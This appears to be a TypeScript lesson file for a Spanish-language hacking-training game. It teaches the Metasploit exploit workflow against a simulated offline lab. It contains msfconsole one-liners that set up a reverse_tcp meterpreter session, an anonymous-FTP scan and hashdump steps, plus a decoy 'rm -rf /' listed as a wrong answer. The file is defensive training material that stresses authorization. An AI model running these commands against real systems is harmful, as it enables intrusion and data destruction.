import type { Curso } from "../courseTypes";

/**
 * Módulo "explotación" de ÑANDE — Metasploit de verdad.
 *
 * Enseña el flujo REAL de un framework de explotación (search → use → set →
 * check → exploit → session) sobre la consola stateful ÑandeMSF. La lección
 * central, la que separa al principiante del profesional: un exploit NO es
 * magia. Sólo funciona si el objetivo tiene DE VERDAD el fallo que el módulo
 * ataca. Por eso el reconocimiento va antes: disparás cuando sabés a qué.
 *
 * Todo golpea la red de laboratorio real (10.10.x.y) y es 100% offline.
 */

const EXPLOIT_MSF: Curso = {
  id: "c-exploit-msf",
  title: "Explotación con Metasploit: de la vuln a la shell",
  subtitle: "El framework real, fase por fase: buscar el módulo, apuntar, comprobar y tomar el sistema.",
  level: "avanzado",
  skill: "pentesting",
  hue: 12,
  glyph: "flame",
  reward: { xp: 360, coins: 300 },
  slides: [
    {
      kind: "concept",
      title: "Un exploit no es magia: es una llave para UNA cerradura",
      body:
        "Metasploit es una consola con cientos de 'llaves' (módulos). Cada llave abre UNA cerradura concreta: un fallo específico, en un servicio específico, en una versión específica. La trampa del principiante es pensar que 'lanzar Metasploit' hackea cualquier cosa. No. Si la máquina no tiene el fallo que tu módulo ataca, el exploit corre, no crea sesión, y listo. Por eso primero se reconoce (nmap) y después se explota lo que EXISTE. En ÑANDE la consola es de verdad stateful: mantiene tu módulo y tus opciones, igual que el msfconsole real.",
      diagram: "capas",
      bullets: [
        "Un módulo = un fallo concreto. No es una ganzúa universal.",
        "Recon primero (a qué disparo), explotación después.",
        "Si el fallo no existe, no hay sesión. Punto.",
      ],
    },
    {
      kind: "concept",
      title: "El flujo real: search → use → set → check → exploit",
      body:
        "Todo módulo se maneja igual, y ese ritmo es lo que memorizás:\n\n1. search <término> — buscás el módulo (por servicio, categoría o CVE).\n2. use <módulo> — lo cargás; la consola precarga sus opciones.\n3. show options — ves qué falta (RHOSTS, PAYLOAD, LHOST, LPORT).\n4. set OPCIÓN valor — apuntás: RHOSTS es la víctima, LHOST/LPORT tu escucha.\n5. check — ¿es vulnerable? (sin explotar todavía).\n6. exploit / run — disparás. Si andaba, se abre una sesión.\n\nEse orden no cambia entre módulos. Aprendés el ritmo una vez y lo aplicás a todo.",
      diagram: "terminal",
      bullets: [
        "RHOSTS = objetivo · LHOST/LPORT = tu máquina de escucha.",
        "check antes de exploit: confirmás sin hacer ruido de más.",
      ],
    },
    {
      kind: "lab",
      title: "Practicá: buscá el módulo",
      body:
        "Entrá a la consola y buscá módulos de inyección de comandos. Vas a ver el catálogo con su ranking y descripción — como en el msfconsole real.",
      command: "msfconsole search cmdi",
      explain:
        "search filtra el catálogo por nombre, categoría o vuln. Aparece exploit/nande/http/cmd_injection (rank excellent): el módulo que ataca la inyección de comandos de la web de OWASP. El ranking te dice qué tan fiable es un exploit — 'excellent' rara vez tumba el servicio.",
      diagram: "escaneo",
    },
    {
      kind: "lab",
      title: "Practicá: ¿es vulnerable? (check antes de disparar)",
      body:
        "Cargá el módulo, apuntá a la máquina OWASP del laboratorio (10.10.5.50) y corré check. Vas a confirmar el fallo SIN explotarlo todavía.",
      command:
        'msfconsole -x "use exploit/nande/http/cmd_injection; set RHOSTS 10.10.5.50; check"',
      explain:
        "check consulta el servicio real y responde: el objetivo ES vulnerable (NANDE-WEB-CMDI). Un profesional confirma antes de lanzar el exploit — evita ruido inútil y sorpresas. Fijate que el módulo mantuvo el estado entre comandos: eso es una consola stateful de verdad.",
      diagram: "inyeccion",
    },
    {
      kind: "concept",
      title: "El payload: qué te deja el exploit adentro",
      body:
        "El exploit es la GRIETA; el payload es lo que metés por la grieta. Los dos grandes tipos:\n\n• bind_tcp: el payload abre un puerto EN la víctima y vos te conectás. Falla si hay firewall de entrada.\n• reverse_tcp: la víctima se conecta HACIA VOS (por eso pedís LHOST/LPORT). Atraviesa la mayoría de los firewalls de salida — por eso es el más usado.\n\nY el tipo de sesión: una shell es una línea de comandos cruda; meterpreter es una sesión rica (sysinfo, subir/bajar archivos, pivotar) que vive en memoria. En ÑandeMSF elegís el payload con set PAYLOAD y lo ves con show payloads.",
      diagram: "payload",
      bullets: [
        "reverse_tcp (víctima→vos) suele ganarle al firewall de salida.",
        "meterpreter > shell: más capacidades, vive en memoria.",
      ],
    },
    {
      kind: "lab",
      title: "Practicá: tomá el sistema (exploit real)",
      body:
        "Ahora sí: cargá el módulo, apuntá RHOSTS a la víctima, poné tu LHOST/LPORT y dispará. Si el objetivo es vulnerable, se abre una sesión meterpreter y cae la bandera del sistema.",
      command:
        'msfconsole -x "use exploit/nande/http/cmd_injection; set RHOSTS 10.10.5.50; set LHOST 10.10.0.5; set LPORT 4444; exploit"',
      explain:
        "El handler inverso escucha, el exploit inyecta el comando y la víctima se conecta de vuelta: 'Sesión meterpreter 1 abierta'. Capturás la bandera NANDE{owasp_top10_labs} y el laboratorio queda resuelto (+XP). Eso es tomar un sistema: de una web vulnerable a una shell adentro. Interactuás con sessions -i 1 (sysinfo, getuid, cat flag).",
      diagram: "exploit",
    },
    {
      kind: "quiz",
      prompt: "Corrés el mismo exploit contra 10.10.5.40 (rootlab), que NO tiene inyección de comandos. ¿Qué pasa?",
      options: [
        "El exploit corre pero NO abre sesión: sin el fallo, no hay explotación",
        "Igual entra: Metasploit siempre encuentra una forma",
        "Rompe la máquina y la apaga",
        "Escala a root directamente",
      ],
      correct: 0,
      explain:
        "Un módulo ataca UN fallo. Si la máquina no lo tiene, el exploit completa pero no crea sesión ('Exploit completed, but no session was created'). No hay ganzúa universal: por eso reconocés primero y explotás lo que confirmaste con check. Esta es LA lección que separa al que entiende del que copia comandos.",
      diagram: "escudo",
    },
    {
      kind: "build",
      goal: "Armar la tirada de una línea que explota la web OWASP con un payload reverse_tcp",
      pieces: [
        "use exploit/nande/http/cmd_injection",
        "set RHOSTS 10.10.5.50",
        "set LHOST 10.10.0.5",
        "set LPORT 4444",
        "exploit",
        "rm -rf /",
        "set RHOSTS google.com",
      ],
      answer: [
        "use exploit/nande/http/cmd_injection",
        "set RHOSTS 10.10.5.50",
        "set LHOST 10.10.0.5",
        "set LPORT 4444",
        "exploit",
      ],
      hint: "Cargás el módulo, apuntás al objetivo del laboratorio, definís tu escucha (LHOST/LPORT) y disparás. Nada de internet real ni de destruir la máquina.",
      explain:
        "use → set RHOSTS (víctima) → set LHOST/LPORT (tu escucha) → exploit. Con msfconsole -x \"...; ...; ...\" corrés toda la secuencia de un tiro. Los señuelos (rm -rf, un objetivo de internet) no van: se ataca SÓLO lo autorizado del laboratorio y no se destruye lo que se audita.",
    },
    {
      kind: "concept",
      title: "Módulos auxiliary y post: no todo es un exploit",
      body:
        "No todos los módulos abren shells:\n\n• exploit — aprovecha un fallo para ejecutar tu payload (la sesión).\n• auxiliary — escanea, verifica o abusa algo sin payload: FTP anónimo, sniffing de Telnet en claro, fuerza bruta.\n• post — actúa DESPUÉS, sobre una sesión que ya tenés: volcar hashes (hashdump), escalar privilegios, buscar credenciales.\n\nEl orden natural: auxiliary/exploit para entrar, post para profundizar. Un módulo post o local exige SESSION (la sesión sobre la que trabaja), no RHOSTS.",
      diagram: "privesc",
      bullets: [
        "exploit entra · auxiliary verifica/abusa sin payload · post profundiza.",
        "Los módulos local/post trabajan sobre una SESSION, no sobre RHOSTS.",
      ],
    },
    {
      kind: "lab",
      title: "Practicá: módulo auxiliary (FTP anónimo)",
      body:
        "netlab01 (10.10.5.20) tiene FTP con acceso anónimo. Usá el módulo auxiliar para detectarlo y listar lo que expone — sin payload, sólo enumeración.",
      command:
        'msfconsole -x "use auxiliary/scanner/ftp/anonymous; set RHOSTS 10.10.5.20; run"',
      explain:
        "Un auxiliary no abre shell: confirma el fallo (login anónimo) y saca loot (los archivos legibles). Es el tipo de módulo que usás en la fase de enumeración, antes de tener acceso real. Acá cae NANDE{enumeracion_de_servicios}.",
      diagram: "escaneo",
    },
    {
      kind: "quiz",
      prompt: "Querés correr post/nande/gather/hashdump pero da 'Faltan opciones: SESSION'. ¿Por qué?",
      options: [
        "Un módulo post actúa sobre una sesión ya abierta: primero tenés que explotar algo y pasarle esa SESSION",
        "Porque hashdump está roto",
        "Porque falta poner RHOSTS",
        "Porque hay que reiniciar la consola",
      ],
      correct: 0,
      explain:
        "hashdump vuelca los hashes DE una máquina en la que ya estás. Sin una sesión previa no hay de dónde volcarlos, por eso pide SESSION en vez de RHOSTS. El flujo es: exploit → sessions -l (ves el id) → use post/... → set SESSION <id> → run. Post-explotación siempre viene DESPUÉS del acceso.",
      diagram: "privesc",
    },
    {
      kind: "concept",
      title: "OPSEC y ética: un exploit deja firma",
      body:
        "Lanzar un exploit no es gratis: el payload tiene firmas que un antivirus/IDS reconoce, la conexión inversa a un puerto raro llama la atención, y el SOC correlaciona todo. En un pentest a veces querés ser detectado (probás la defensa); en un red team el sigilo es el objetivo. Y lo de siempre: cada módulo que corriste acá golpea SÓLO el laboratorio 10.10.x.y. La misma técnica, sin autorización y contra un sistema real, es un delito. Demostrar sin dañar, reportar para que se arregle: esa es la línea.",
      diagram: "firewall",
      bullets: [
        "Payloads y conexiones inversas dejan firma: el SOC las caza.",
        "Sólo lo autorizado. Demostrar sin dañar. Reportar para defender.",
      ],
    },
  ],
};

export const EXPLOTACION_COURSES: Curso[] = [EXPLOIT_MSF];
